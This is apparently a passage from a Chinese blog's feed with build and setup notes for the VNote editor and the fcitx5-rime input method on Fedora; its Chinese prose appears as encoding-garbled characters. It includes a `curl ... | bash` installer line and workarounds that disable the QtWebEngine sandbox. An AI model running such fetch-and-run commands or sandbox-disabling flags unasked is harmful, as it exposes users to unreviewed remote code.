å’Œå®ƒçš„äº”ç§ç”¨æ³•</a><br><a href="https://sspai.com/post/65273">è¯·ä¸è¦ç¥åŒ–åŒé“¾ç¬”è®°</a></p><p><a href="https://www.usmacd.com/cn/logseq2/">https://www.usmacd.com/cn/logseq2/</a><br><a href="https://www.usmacd.com/cn/logseq3/">https://www.usmacd.com/cn/logseq3/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdown ç¬”è®°è½¯ä»¶ï¼š VNote</title>
    <link href="/cn/vnote/"/>
    <url>/cn/vnote/</url>
    
    <content type="html"><![CDATA[<h2 id="VNote-ç®€ä»‹"><a href="#VNote-ç®€ä»‹" class="headerlink" title="VNote ç®€ä»‹"></a>VNote ç®€ä»‹</h2><p>å‘å¤§å®¶å®‰åˆ©ä¸€æ¬¾ markdown ç¬”è®°è½¯ä»¶ï¼Œ VNote <a href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a><br>æ­¤è½¯ä»¶ç›®å‰å·²ç» 1300 å¤šä¸ªcommits äº†ï¼Œåšä¸ºä¸€ä¸ªæœ‰äº›å¼€æºè½¯ä»¶ç»´æŠ¤ç»å†çš„äººï¼Œæ·±æ„Ÿä¸æ˜“ã€‚ç”¨äº†å¤ªå¤š markdown ç¬”è®°è½¯ä»¶ï¼Œæ­¤è½¯ä»¶ä½¿å¾—æœ€ä¸ºé¡ºæ‰‹ï¼Œå°¤å…¶ä½œä¸ºç¨‹åºå‘˜ vim æ¨¡å¼ è®©æˆ‘æ„Ÿåˆ°éå¸¸èˆ’æœï¼Œå¤§é‡å›¾è¡¨çš„æ”¯æŒæ¯”å¦‚ UML æµç¨‹å›¾ï¼Œè®©æˆ‘ç”¨èµ·æ¥å¾ˆé¡ºæ‰‹ã€‚</p><p>Vnote åˆ†ä¸ºä¸¤ä¸ªå¼€å‘é˜¶æ®µï¼Œé˜¶æ®µä¸€ vnote2 å·²ç»å¼€å‘å®Œæˆï¼š<a href="https://github.com/vnotex/vnote/tree/vnote2">https://github.com/vnotex/vnote/tree/vnote2</a><br>ç°åœ¨å¤„äºç¬¬äºŒä¸ªå¼€å‘é˜¶æ®µï¼š<a href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a></p><p>æ®è¯´åç»­ä¼šå‡ºæ”¶è´¹ç‰ˆæœ¬ï¼Œä½†ç›®å‰çœ‹è¿˜éœ€è¦å¾ˆé•¿çš„ä¸€æ®µæ—¶é—´äº†ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/vnote.png" alt="VNote"></p><p>æˆ‘å‰åå°è¯•è¿‡å„ç§ç¬”è®°è½¯ä»¶ï¼Œæˆ‘ç†æƒ³çš„è½¯ä»¶æœ‰å‡ ç‚¹ï¼š</p><ul><li>a. æ”¯æŒæ–‡ä»¶ç®¡ç†</li><li>b. ä¸è¦ä¹±æ”¹æ•°æ®ï¼Œå®¹æ˜“è¿ç§»</li><li>c. æ”¯æŒ markdown</li><li>d. è·¨å¹³å°ï¼Œæ”¯æŒ Mac å’Œ Linux</li></ul><p>æœ€åï¼Œç»ˆäºå‘ç°äº† VNoteï¼Œæœ‰ç‚¹æƒŠå–œã€‚</p><h2 id="Fedora-ä¸Šä½¿ç”¨-Qt5-ç¼–è¯‘-VNote"><a href="#Fedora-ä¸Šä½¿ç”¨-Qt5-ç¼–è¯‘-VNote" class="headerlink" title="Fedora ä¸Šä½¿ç”¨ Qt5 ç¼–è¯‘ VNote"></a>Fedora ä¸Šä½¿ç”¨ Qt5 ç¼–è¯‘ VNote</h2><p>åœ¨ Linux ä¸‹ç¼–è¯‘ VNote æ˜¾ç¤ºæœ‰æ˜æ˜¾æ”¹è¿›ï¼Œä¸‹é¢æ˜¯ç¼–è¯‘çš„æ–¹æ³•ï¼š</p><ol><li>ä¸‹è½½ QT SDK  ï¼ˆæœ€æ–°çš„ vnotex å®˜æ–¹æ”¯æŒ Qt 5.15.2ï¼Œå¯è‡ªè¡Œä¸‹è½½ä½¿ç”¨æ›¿æ¢ç›¸åº”çš„ç‰ˆæœ¬å³å¯ï¼‰</li></ol><p><a href="https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run">https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run</a></p><p>å°† Qt5.9 å®‰è£…åˆ° &#x2F;home&#x2F;henices&#x2F;Qt5.9.0&#x2F;</p><ol start="2"><li>ç¼–è¯‘ fcitx-qt5 ï¼ˆå¦‚æœä½¿ç”¨çš„æ˜¯ fcitx5ï¼Œéœ€è¦ä¸‹è½½ç¼–è¯‘ fcitx5-qtï¼‰</li></ol><p>git clone <a href="https://gitlab.com/fcitx/fcitx-qt5.git">https://gitlab.com/fcitx/fcitx-qt5.git</a></p><p>å‡†å¤‡ç¼–è¯‘è„šæœ¬ <code>build_linux.sh</code>ï¼Œ æŒ‡å®šä¸‹è½½çš„QT</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">QTDIR=<span class="hljs-string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span><br>PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$QTDIR</span>/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br>LDFLAGS=-L<span class="hljs-variable">$QTDIR</span>/lib<br>CPPFLAGS=-I<span class="hljs-variable">$QTDIR</span>/include<br><br><span class="hljs-built_in">rm</span> -rf build<br><span class="hljs-built_in">mkdir</span> -p build<br><span class="hljs-built_in">cd</span> build<br>cmake ..<br>make -j8<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‹é¢å‘½ä»¤ç¼–è¯‘</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">chmod</span> a+x ./build_linux.sh<br>./build_linux.sh<br></code></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„ libfcitxplatforminputcontextplugin.so copy åˆ°<br><code>/home/henices/Qt5.9.0/5.9/gcc_64/plugins/platforminputcontexts/</code></p><ol start="3"><li>è·å–VNote æºç </li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/tamlok/vnote.git vnote.git<br><span class="hljs-built_in">cd</span> vnote.git<br>git submodule update --init<br></code></pre></td></tr></table></figure><ol start="4"><li>ç¼–è¯‘</li></ol><p>build_linux.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh">QTDIR=<span class="hljs-string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span><br>PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$QTDIR</span>/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br>LDFLAGS=-L<span class="hljs-variable">$QTDIR</span>/lib<br>CPPFLAGS=-I<span class="hljs-variable">$QTDIR</span>/include<br><br><span class="hljs-built_in">rm</span> -rf build<br><span class="hljs-built_in">mkdir</span> -p build<br><span class="hljs-built_in">cd</span> build<br>qmake -v<br>qmake PREFIX=/usr/local CONFIG-=debug CONFIG+=release ../VNote.pro<br>make -j8<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸‹é¢å‘½ä»¤ç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> a+x ./build_linux.sh<br>./build_linux.sh<br></code></pre></td></tr></table></figure><ol start="5"><li>å®‰è£…</li></ol><p><code>sudo make install</code></p><h3 id="Qt-5-12-11-çš„è¯¡å¼‚é—®é¢˜"><a href="#Qt-5-12-11-çš„è¯¡å¼‚é—®é¢˜" class="headerlink" title="Qt 5.12.11 çš„è¯¡å¼‚é—®é¢˜"></a>Qt 5.12.11 çš„è¯¡å¼‚é—®é¢˜</h3><p>Fedora å‡çº§åˆ° 35 åï¼ŒVnote å‡ºç°äº†ä¸€ç³»åˆ—é—®é¢˜</p><ol><li>vnote çš„é˜…è¯»æ¨¡å¼ä¸èƒ½æ­£å¸¸æ˜¾ç¤º ï¼ˆQt 5.12.11ï¼‰ï¼Œè§£å†³è¿™ä¸ªé—®é¢˜éœ€è¦ç¦ç”¨ Qtwebengine çš„ sandbox</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./vnote --no-sandbox<br></code></pre></td></tr></table></figure><ol start="2"><li>å¯¼å‡º pdf æ–‡ä»¶ cpu 100%  ï¼ˆFedora ç³»ç»Ÿè‡ªå¸¦ Qt 5.15.2 ç¼–è¯‘ï¼‰</li><li>å®˜æ–¹æä¾›çš„ Linux AppImage æ–‡ä»¶æ— æ³•æ‰“å¼€ Fcitx5 è¾“å…¥æ³•ã€‚</li></ol><p>æœ€ç»ˆè§£å†³é—®é¢˜çš„æ–¹æ³•æ˜¯ä¸‹è½½ Qt5.15.2 é‡æ–°ç¼–è¯‘ Vnoteï¼Œ Qt ä» 5.15 å¼€å§‹ä¸æä¾›ç¦»çº¿å®‰è£…åŒ…ï¼Œéå¸¸ä¸æ–¹ä¾¿ã€‚<br>å®˜æ–¹æä¾›çš„åœ¨çº¿å‡çº§åŒ…å¦‚æœå¤ªæ–°åªèƒ½å®‰è£… Qt 6ï¼Œæ‰€ä»¥å¿…é¡»ä¸‹è½½è€ç‰ˆæœ¬çš„ online installer<br><a href="https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run">https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run</a></p><p>å…·ä½“å†…å®¹å¯ä»¥å‚è€ƒ <a href="https://github.com/vnotex/vnote/issues/1942">https://github.com/vnotex/vnote/issues/1942</a> çš„è®¨è®º</p><p>2022.8.2 æ›´æ–°</p><p>å¯¼å‡º pdf æ–‡ä»¶ cpu 100% çš„é—®é¢˜ï¼Œæˆ‘è°ƒè¯• Qt 5.15.5 ä»£ç æ—¶å·²ç»è§£å†³ï¼Œå¯ä»¥å‚è€ƒï¼š<br><a href="https://github.com/vnotex/vnote/commit/53e2b3bfa8aff4f590471caf5e8cc55c8b8b538b">https://github.com/vnotex/vnote/commit/53e2b3bfa8aff4f590471caf5e8cc55c8b8b538b</a></p><h3 id="Qt-5-15-3-çš„è¯¡å¼‚é—®é¢˜"><a href="#Qt-5-15-3-çš„è¯¡å¼‚é—®é¢˜" class="headerlink" title="Qt 5.15.3 çš„è¯¡å¼‚é—®é¢˜"></a>Qt 5.15.3 çš„è¯¡å¼‚é—®é¢˜</h3><p>ä½¿ç”¨ Qt 5.15.3 ç¼–è¯‘ VNOte åï¼Œå‡ºç°ä¸‹é¢çš„æŠ¥é”™</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[<span class="hljs-number">695784</span><span class="hljs-symbol">:</span><span class="hljs-number">695784</span><span class="hljs-symbol">:</span><span class="hljs-number">0401</span>/<span class="hljs-number">181224.580254</span><span class="hljs-symbol">:ERROR</span><span class="hljs-symbol">:network_service_instance_impl</span>.cc(<span class="hljs-number">286</span>)] <span class="hljs-title class_">Network</span> service crashed, restarting service.<br></code></pre></td></tr></table></figure><p>bug åœ¨è¿™ <a href="https://bugreports.qt.io/browse/QTBUG-91715">https://bugreports.qt.io/browse/QTBUG-91715</a> å¯ä»¥å…ˆä½¿ç”¨ç¯å¢ƒå˜é‡æ•‘æ€¥ä¸€ä¸‹</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">QTWEBENGINE_DISABLE_SANDBOX=1 QTWEBENGINE_CHROMIUM_FLAGS=<span class="hljs-params">--lang=de</span> <span class="hljs-string">./vnote</span> <span class="hljs-params">--no-sandbox</span> <span class="hljs-params">--disable-gpu</span><br></code></pre></td></tr></table></figure><p>2022.8.2 æ›´æ–°: Qt 5.15.5 å·²ç»ä¿®å¤äº†è¿™ä¸ªé—®é¢˜ã€‚</p><h2 id="Fedora-ä¸Šä½¿ç”¨-Qt6-ç¼–è¯‘-VNote"><a href="#Fedora-ä¸Šä½¿ç”¨-Qt6-ç¼–è¯‘-VNote" class="headerlink" title="Fedora ä¸Šä½¿ç”¨ Qt6 ç¼–è¯‘ VNote"></a>Fedora ä¸Šä½¿ç”¨ Qt6 ç¼–è¯‘ VNote</h2><p>æœ€è¿‘ï¼ŒVNote è¿æ¥äº†ä¸€ä¸ªå¤§æ›´æ–°ï¼Œæ”¯æŒQt6 å¹¶ä¿ç•™äº†å¯¹ Qt5 çš„æ”¯æŒã€‚ä½¿ç”¨Qt6 ç¼–è¯‘ VNote éœ€è¦å®‰è£…ä¸€äº›ä¾èµ–åº“ï¼Œä¸‹é¢çš„å¯èƒ½ä¸å…¨ï¼Œéœ€è¦æ ¹æ®å…·ä½“æƒ…å†µè°ƒæ•´ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo dnf install qt6-qtbase-devel qt6-qt5compat-devel qt6-qtsvg-devel qt6-qtwebengine-devel<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ Fedora ç³»ç»Ÿè‡ªå¸¦çš„ Qt6 ç¼–è¯‘æ¯”è¾ƒç®€å•ï¼Œåœ¨ VNote çš„æºç ç›®å½•æ–°å»ºä¸€ä¸ªè„šæœ¬ build.shï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">VNOTEDIR=~/vnote/<br><span class="hljs-built_in">mkdir</span> -p build_system<br><span class="hljs-built_in">cd</span> build_system<br>/lib64/qt6/bin/qmake PREFIX=<span class="hljs-variable">$&#123;VNOTEDIR&#125;</span> CONFIG+=release -spec linux-g++-64 ../vnote.pro<br>make -j`<span class="hljs-built_in">nproc</span>` &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>VNOTEDIR ä¸ºå®‰è£…ç›®å½•éœ€è¦è‡ªå·±å®šä¹‰ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤ <code>chmod a+x .build.sh &amp;&amp; bash ./build.sh</code> å³å¯å®Œæˆç¼–è¯‘å’Œå®‰è£…ã€‚</p><h3 id="Fedora-ä¸Šä½¿ç”¨-Qt6-ç¼–è¯‘-VNote-çš„æ–°æ–¹æ³•-ï¼ˆ2024-6-14ï¼‰"><a href="#Fedora-ä¸Šä½¿ç”¨-Qt6-ç¼–è¯‘-VNote-çš„æ–°æ–¹æ³•-ï¼ˆ2024-6-14ï¼‰" class="headerlink" title="Fedora ä¸Šä½¿ç”¨ Qt6 ç¼–è¯‘ VNote çš„æ–°æ–¹æ³• ï¼ˆ2024.6.14ï¼‰"></a>Fedora ä¸Šä½¿ç”¨ Qt6 ç¼–è¯‘ VNote çš„æ–°æ–¹æ³• ï¼ˆ2024.6.14ï¼‰</h3><p>ä¸€ä¸ªå¥½æ¶ˆæ¯ï¼ŒVNote çš„ä½œè€…è¿˜åœ¨åŠªåŠ›æ›´æ–°ä¸­ã€‚</p><p>tamlok é‡å†™äº† vnote çš„æ„å»ºä»£ç ï¼Œè¾ƒå¤§çš„å˜åŒ–æ˜¯é¡¹ç›®æ–‡ä»¶ä¸‹çš„ vnote.pro è¢«åˆ é™¤äº†ï¼ŒLinux ä¸‹ä¹Ÿä½¿ç”¨ cmake è¿›è¡Œç¼–è¯‘ï¼Œå‚è€ƒ <a href="https://github.com/vnotex/vnote/blob/master/.github/workflows/ci-linux.yml">ci-linux</a> çš„ä»£ç ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Configure</span> <span class="hljs-string">Project</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    qmake -v</span><br><span class="hljs-string">    cmake --version</span><br><span class="hljs-string">    cmake $&#123;GITHUB_WORKSPACE&#125;</span><br><span class="hljs-string"></span>  <span class="hljs-attr">working-directory:</span> <span class="hljs-string">$&#123;&#123;runner.workspace&#125;&#125;/build</span><br><br><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">Project</span><br>  <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    cmake --build . --target pack</span><br><span class="hljs-string"></span>  <span class="hljs-attr">working-directory:</span> <span class="hljs-string">$&#123;&#123;runner.workspace&#125;&#125;/build</span><br></code></pre></td></tr></table></figure><p>é‡æ–°å†™ä¸€ä¸ª <code>build.sh</code> , è¿›è¡Œè‡ªåŠ¨åŒ–çš„ vnote ç¼–è¯‘ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">VNOTEDIR=~/vnote/<br><span class="hljs-built_in">mkdir</span> -p build_system<br><span class="hljs-built_in">cd</span> build_system<br><span class="hljs-comment">#/lib64/qt6/bin/qmake PREFIX=$&#123;VNOTEDIR&#125; CONFIG+=release -spec linux-g++-64 ../vnote.pro</span><br>cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=<span class="hljs-variable">$&#123;VNOTEDIR&#125;</span> ..<br>make -j`<span class="hljs-built_in">nproc</span>` &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œå‘½ä»¤ <code>chmod a+x .build.sh &amp;&amp; bash ./build.sh</code> å³å¯å®Œæˆç¼–è¯‘å’Œå®‰è£…ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md">https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md</a></p><p><a href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fedora KDE Plasma ä¸Šå®‰è£… fcitx5 rime</title>
    <link href="/cn/fcitx5-rime/"/>
    <url>/cn/fcitx5-rime/</url>
    
    <content type="html"><![CDATA[<p>ç°åœ¨ fcitx å·²ç»å‡çº§åˆ°äº† fcitx5, æœ¬æ¥ç”¨ç€ fcitx4 æŒºå¥½ï¼Œä¹Ÿæ²¡æœ‰æƒ³ç€å‡çº§ï¼Œåœ¨æŠ˜è…¾ fcitx.vim çš„æ—¶å€™å‘ç° fcitx å±…ç„¶å‡çº§äº†ï¼Œä½¿å¾—æˆ‘çš„ vim æ’ä»¶æ— æ³•æ­£å¸¸å·¥ä½œäº†ï¼Œä¸€é¡¿æŠ˜è…¾ï¼Œæœ¬æ¥ä»¥ä¸ºå¾ˆç®€å•æ²¡æƒ³åˆ°è¿›äº†ä¸ªå¤§å‘ ã€‚<br>ä¸»è¦æ˜¯ä¸æ„¿æ„æ”¾å¼ƒæˆ‘çš„ä¸€ä¸‡å¤šè¡Œçš„ rime ç”¨æˆ·è¯åº“ï¼Œå¤šå¹´çš„ç§¯ç´¯äº†ï¼Œä¸è¿‡ Linux ç”¨æˆ·ä¸å°±æ˜¯è€æŠ˜è…¾å—ï¼Œ å”‰ã€‚</p><p>fcitx5-rime çš„é»˜è®¤çš„é…ç½®ç›®å½•å·²ç»å˜ä¸º <code>~/.local/share/fcitx5/rime</code>ï¼Œ fcitx4 é»˜è®¤çš„é…ç½®ç›®å½•æ˜¯ <code>~/.config/fcitx/rime</code></p><h2 id="å®‰è£…-fcitx5-å’Œ-fcitx5-rime"><a href="#å®‰è£…-fcitx5-å’Œ-fcitx5-rime" class="headerlink" title="å®‰è£… fcitx5 å’Œ fcitx5 rime"></a>å®‰è£… fcitx5 å’Œ fcitx5 rime</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf install -y fcitx5 fcitx5-autostart fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-qt kcm-fcitx5<br>sudo dnf install -y fcitx5-rime<br></code></pre></td></tr></table></figure><p>Fedora dnf å·²ç»é»˜è®¤æœ‰ fcitx5-rime çš„å®‰è£…åŒ…äº†ï¼Œä¸ç”¨è‡ªå·±é‡æ–°ç¼–è¯‘äº†ï¼Œéå¸¸ä¸é”™ã€‚ <code>fcitx5-chinese-addons </code> ä¸º fcitx5 è‡ªå·±é»˜è®¤å¸¦çš„ä¸­æ–‡è¾“å…¥æ³•ï¼Œè¿™äº›å’Œ rime æ²¡æœ‰ä»€ä¹ˆå…³ç³»ï¼Œç½‘ç»œä¸Šæœ‰äººè¯´ï¼Œ fcitx çš„ä¸­æ–‡è¾“å…¥è¾ƒä»¥å‰æœ‰è¾ƒå¤§æ”¹è¿›ã€‚<code>fcitx5-autostart</code> ç”¨äºè‡ªå¯åŠ¨ï¼Œä¸å®‰è£…å…¶å®ä¹Ÿæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚</p><p>Fcitx5 å®˜æ–¹è¯´æ˜éœ€è¦è®¾ç½®å¯åŠ¨æ–‡ä»¶ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">mkdir</span> -p ~/.config/autostart &amp;&amp; <span class="hljs-built_in">cp</span> /usr/share/applications/org.fcitx.Fcitx5.desktop ~/.config/autostart<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤ <code>sudo alternatives --config xinputrc</code>  ï¼Œé€‰æ‹© fcitx5ã€‚æ‰§è¡Œå‘½ä»¤ <code>im-chooser</code> é€‰æ‹© fcitx5</p><p>å¯åŠ¨è¾“å…¥æ³•å¾ˆç®€å•ï¼Œè‡ªå·±æ‰‹åŠ¨æ‰§è¡Œ <code>fcitx5 -d</code> å³å¯ã€‚</p><h2 id="è®¾ç½®æ­£ç¡®çš„ç¯å¢ƒå˜é‡"><a href="#è®¾ç½®æ­£ç¡®çš„ç¯å¢ƒå˜é‡" class="headerlink" title="è®¾ç½®æ­£ç¡®çš„ç¯å¢ƒå˜é‡"></a>è®¾ç½®æ­£ç¡®çš„ç¯å¢ƒå˜é‡</h2><p>ä¿®æ”¹  <code>~/.xprofile</code>ï¼Œ <code>~/.zshrc</code> ï¼Œ  <code>~/.xinitrc</code> ï¼Œ<code>~/.bash_profile</code> ï¼Œ <code>/etc/profile</code> ç­‰æ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">GTK_IM_MODULE</span>=fcitx<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">QT_IM_MODULE</span>=fcitx<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">XMODIFIERS</span>=<span class="hljs-string">&quot;@im=fcitx&quot;</span><br></code></pre></td></tr></table></figure><p>æœ‰çš„æ–‡ç« ä¸­è¯´è¦è®¾ç½®æˆ fcitx5 ä½†æ˜¯æ ¹æ® <code>fcitx5-diagnose</code> æ­£ç¡®çš„ç¯å¢ƒå˜é‡åº”è¯¥æ˜¯ fcitx</p><p> environment.d æ˜¯ system.d å¼•å…¥çš„ï¼Œè¢« Â GDM æˆ– Plasma 5.22+ æ”¯æŒï¼Œå¯ä»¥å¾€ <code>~/.config/environment/</code> ç›®å½•å†™æ–‡ä»¶ï¼Œæ³¨æ„ä¸è¦å†™ <strong>export</strong> ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF &gt; ~/.config/environment.d/00-fcitx5.conf</span><br><span class="hljs-string">INPUT_METHOD=fcitx5</span><br><span class="hljs-string">GTK_IM_MODULE=fcitx</span><br><span class="hljs-string">QT_IM_MODULE=fcitx</span><br><span class="hljs-string">XMODIFIERS=@im=fcitx</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><h2 id="é…ç½®ä¸­æ–‡ç¯å¢ƒ"><a href="#é…ç½®ä¸­æ–‡ç¯å¢ƒ" class="headerlink" title="é…ç½®ä¸­æ–‡ç¯å¢ƒ"></a>é…ç½®ä¸­æ–‡ç¯å¢ƒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/locale.conf<br><br><span class="hljs-built_in">export</span> LANG=<span class="hljs-string">&quot;zh_CN.UTF-8&quot;</span><br><span class="hljs-built_in">export</span> LC_CTYPE=<span class="hljs-string">&quot;zh_CN.UTF-8&quot;</span><br></code></pre></td></tr></table></figure><h2 id="å®‰è£…-rime-è¯åº“"><a href="#å®‰è£…-rime-è¯åº“" class="headerlink" title="å®‰è£… rime è¯åº“"></a>å®‰è£… rime è¯åº“</h2><p>rime ç°åœ¨å·²ç»ä½¿ç”¨ plum ç®¡ç†è¯åº“ï¼Œå¦‚æœéœ€è¦å®‰è£…åŒæ‹¼è¾“å…¥æ³•çš„ï¼Œå¯ä»¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL https://git.io/rime-install | bash<br>rime_frontend=fcitx5-rime bash rime-install double_pinyin<br></code></pre></td></tr></table></figure><p>rime ä¸ºäº†ä¿è¯è¾“å…¥é€Ÿåº¦ï¼Œè¯åº“å¾ˆå°ï¼Œä¸ºäº†èƒ½å¤Ÿè‡ªåŠ¨æ˜¾ç¤ºæ›´å¤šçš„è¯ç»„ï¼Œå°±éœ€è¦ä½¿ç”¨æ‹“å±•è¯åº“ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/rime-aca/dictionaries.git<br><span class="hljs-built_in">cp</span> dictionaries/luna_pinyin.dict/* ~/.local/share/fcitx5/rime/<br></code></pre></td></tr></table></figure><p>å®‰è£…äº†ä¸Šé¢çš„æ‹“å±•è¯åº“åï¼Œè¾“å…¥ç‰¹æ®Šç¬¦å·çš„èƒ½åŠ›è¿˜æ˜¯æ¯”è¾ƒå¼±ï¼Œéœ€è¦æŠŠ symbols.yaml ä¹Ÿç»™åŠ è¿›æ¥ã€‚</p><p><a href="https://github.com/rime/rime-prelude">https://github.com/rime/rime-prelude</a> æä¾›äº†æˆ‘ä»¬æ‰€éœ€è¦çš„ symbols.yaml å’Œ default.yamlï¼Œå¯ä»¥ä½¿ç”¨ <a href="https://github.com/rime/plum">æ±é¢¨ç ´</a> å®‰è£ï¼š <code>rime_frontend=fcitx5-rime bash rime-install prelude</code></p><p>ç”±äºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯è‡ªç„¶ç åŒæ‹¼ï¼Œéœ€è¦ä¿®æ”¹çš„æ–‡ä»¶ä¸º <code>double_pinyin.custom.yaml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">patch:</span><br>  <span class="hljs-comment"># è¼‰å…¥æœ™æœˆæ‹¼éŸ³æ“´å……è©åº«</span><br>  <span class="hljs-attr">&quot;translator/dictionary&quot;:</span> <span 